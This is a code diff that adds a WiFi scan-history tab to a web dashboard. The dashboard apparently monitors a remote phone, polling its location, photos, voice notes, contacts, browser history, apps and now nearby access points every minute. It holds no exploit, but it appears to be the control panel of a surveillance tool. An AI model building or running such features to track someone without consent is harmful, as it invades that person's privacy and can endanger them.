@@ -166,6 +166,23 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 .leaflet-control-layers label{color:#c9d1d9!important;font-size:13px!important;cursor:pointer!important}
 .leaflet-control-layers input{margin-right:8px!important;accent-color:#ffca28!important}
 .leaflet-control-layers a{color:#ffca28!important}
+.wifi-signal{display:inline-flex;gap:2px;align-items:center;min-width:24px}
+.wifi-signal .bar{width:3px;border-radius:1px;background:var(--border)}
+.wifi-signal .bar.on{background:var(--accent)}
+.wifi-signal .bar.on.s3{background:var(--success)}
+.wifi-signal .bar.on.s1{background:var(--danger)}
+.wifi-latest{background:rgba(63,185,80,.06)!important;border-left-color:var(--success)!important}
+.wifi-ap-row{display:flex;gap:8px;align-items:center;padding:4px 0;border-bottom:1px solid var(--border);font-size:11px}
+.wifi-ap-row:last-child{border-bottom:none}
+.wifi-ap-row .wifi-ssid{min-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.wifi-ap-row .wifi-bssid{color:var(--muted);font-family:monospace;font-size:10px;min-width:80px}
+.wifi-ap-row .wifi-rssi{color:var(--muted);min-width:45px}
+.wifi-ap-row .wifi-band{color:var(--muted);min-width:40px}
+.wifi-ap-row .wifi-cap{color:var(--muted);font-size:9px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:120px}
+.wifi-prev-header{cursor:pointer;user-select:none;display:flex;align-items:center;gap:6px}
+.wifi-prev-header:hover{color:var(--accent)}
+.wifi-prev-body{overflow:hidden;transition:max-height .2s}
+.wifi-prev-body.closed{max-height:0!important}
 </style>
 </head>
 <body>
@@ -193,6 +210,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
 <button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
 <button class="tab-btn" data-tab="permissions">&#x1F512; Perms</button>
+<button class="tab-btn" data-tab="wifi">&#x1F4E1; WiFi</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -203,7 +221,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <div><div class="label">Speed</div><div class="value" id="spdVal">--</div></div>
 <div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
 <div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
-<div><div class="label">WiFi</div><div class="value" id="wifiVal">--</div></div>
+<div><div class="label">WiFi</div><div class="value" id="wifiVal">-- <span id="wifiApCount" style="font-size:11px;color:var(--muted);font-weight:400"></span></div></div>
 <div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
 <div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:11px">--</div></div>
 </div>
@@ -323,6 +341,15 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <input type="text" id="permSearch" placeholder="&#x1F50D; Search app or permission..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
 <div style="font-size:10px;color:var(--muted);margin-bottom:6px" id="permSyncInfo"></div>
 <div id="permList"><div class="label">No permissions data yet</div></div>
+</div>
+<div id="tab-wifi">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+<span style="font-size:14px;font-weight:500">&#x1F4E1; WiFi Scan History</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollWifiScans()">&#x1F504; Refresh</span>
+</div>
+<div style="font-size:11px;color:var(--muted);margin-bottom:8px">Live scans every 60s from device. Latest scan shown at top with full detail.</div>
+<input type="text" id="wifiSearch" placeholder="&#x1F50D; Filter by SSID or BSSID..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
+<div id="wifiList"><div class="label">No WiFi scan data yet</div></div>
 </div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
@@ -733,6 +760,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'storage') refreshStorage();
     if (btn.dataset.tab === 'browser') pollBrowserHistory();
     if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
+    if (btn.dataset.tab === 'wifi') pollWifiScans();
   });
 });
 
@@ -774,6 +802,7 @@ function startPolling() {
   schedulePoll('queue', 30000, pollQueueSize);
   schedulePoll('browser', 120000, pollBrowserHistory);
   schedulePoll('insights', 120000, renderInsights);
+  schedulePoll('wifi', 60000, pollWifiScans);
 }
 
 function schedulePoll(name, interval, fn) {
@@ -785,7 +814,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions()];
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -2451,6 +2480,111 @@ async function pollPermissions() {
 }
 
 document.getElementById('permSearch')?.addEventListener('input', renderPermissions);
+
+// --- WiFi ---
+let wifiCache = [];
+
+async function pollWifiScans() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/wifi_scan`);
+  if (!data || typeof data !== 'object') {
+    wifiCache = [];
+    document.getElementById('wifiList').innerHTML = '<div class="label">No WiFi scan data yet</div>';
+    return;
+  }
+  wifiCache = Object.entries(data)
+    .map(([ts, val]) => ({
+      ts: parseInt(ts),
+      networks: (val.networks || []).map(n => ({
+        ssid: n.ssid || '',
+        bssid: n.bssid || '',
+        rssi: n.rssi != null ? parseInt(n.rssi) : -100,
+        frequency: n.frequency || 0,
+        capabilities: n.capabilities || ''
+      }))
+    }))
+    .filter(s => s.ts && s.networks.length)
+    .sort((a, b) => b.ts - a.ts)
+    .slice(0, 50);
+  // Show visible AP count on live tab
+  if (wifiCache.length) {
+    const latestAps = wifiCache[0].networks.length;
+    document.getElementById('wifiApCount').textContent = '📡 ' + latestAps;
+  }
+  renderWifiScans();
+}
+
+function renderWifiScans() {
+  const list = document.getElementById('wifiList');
+  const query = (document.getElementById('wifiSearch').value || '').toLowerCase();
+  if (!wifiCache.length) {
+    list.innerHTML = '<div class="label">No WiFi scan data yet</div>';
+    return;
+  }
+  let html = '';
+  for (let i = 0; i < wifiCache.length; i++) {
+    const scan = wifiCache[i];
+    let aps = scan.networks;
+    if (query) {
+      aps = aps.filter(n => n.ssid.toLowerCase().includes(query) || n.bssid.toLowerCase().includes(query));
+    }
+    if (!aps.length && query) continue;
+    aps.sort((a, b) => b.rssi - a.rssi);
+    const isLatest = i === 0;
+    const signalBars = (rssi) => {
+      if (rssi > -50) return 4;
+      if (rssi > -65) return 3;
+      if (rssi > -80) return 2;
+      return 1;
+    };
+    const barColor = (rssi) => rssi > -50 ? 'var(--success)' : rssi > -65 ? 'var(--accent)' : 'var(--danger)';
+    const band = (freq) => freq >= 5000 ? '5G' : freq >= 2400 ? '2.4' : '?';
+    const apRows = aps.slice(0, 30).map(n => {
+      const bars = signalBars(n.rssi);
+      const color = barColor(n.rssi);
+      const barHtml = '<span class="wifi-signal">' +
+        [1,2,3,4].map(j => `<span class="bar ${j <= bars ? 'on' : ''}" style="height:${4+j*2}px;background:${j <= bars ? color : 'var(--border)'}"></span>`).join('') +
+        '</span>';
+      return `<div class="wifi-ap-row">
+        ${barHtml}
+        <span class="wifi-ssid">${escHtml(n.ssid || '—')}</span>
+        <span class="wifi-bssid">${n.bssid || '—'}</span>
+        <span class="wifi-rssi">${n.rssi}dBm</span>
+        <span class="wifi-band">${band(n.frequency)}</span>
+        <span class="wifi-cap">${escHtml(n.capabilities || '')}</span>
+      </div>`;
+    }).join('');
+
+    if (isLatest) {
+      html += `<div class="card wifi-latest" style="padding:12px;margin-bottom:8px">
+        <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+          <span style="font-size:13px;font-weight:600;color:var(--success)">&#x1F4E1; Latest Scan</span>
+          <span style="font-size:12px;color:var(--muted)">📡 ${aps.length} access points</span>
+        </div>
+        <div style="font-size:11px;color:var(--muted);margin-bottom:6px">🕐 ${pkt(scan.ts)}</div>
+        ${apRows}
+      </div>`;
+    } else {
+      const prevId = 'wifi-prev-' + i;
+      html += `<div class="card" style="padding:10px 14px;margin-bottom:4px">
+        <div class="wifi-prev-header" onclick="toggleWifiPrev('${prevId}')">
+          <span>🕐 ${pkt(scan.ts)}</span>
+          <span style="font-size:11px;color:var(--muted)">📡 ${aps.length} APs</span>
+          <span style="font-size:10px;color:var(--muted);margin-left:auto">&#x25BC;</span>
+        </div>
+        <div id="${prevId}" class="wifi-prev-body closed">${apRows}</div>
+      </div>`;
+    }
+  }
+  list.innerHTML = html || '<div class="label">No WiFi scans match your search</div>';
+}
+
+function toggleWifiPrev(id) {
+  const el = document.getElementById(id);
+  if (el) el.classList.toggle('closed');
+}
+
+document.getElementById('wifiSearch')?.addEventListener('input', renderWifiScans);
 
 // --- Init ---
 async function init() {
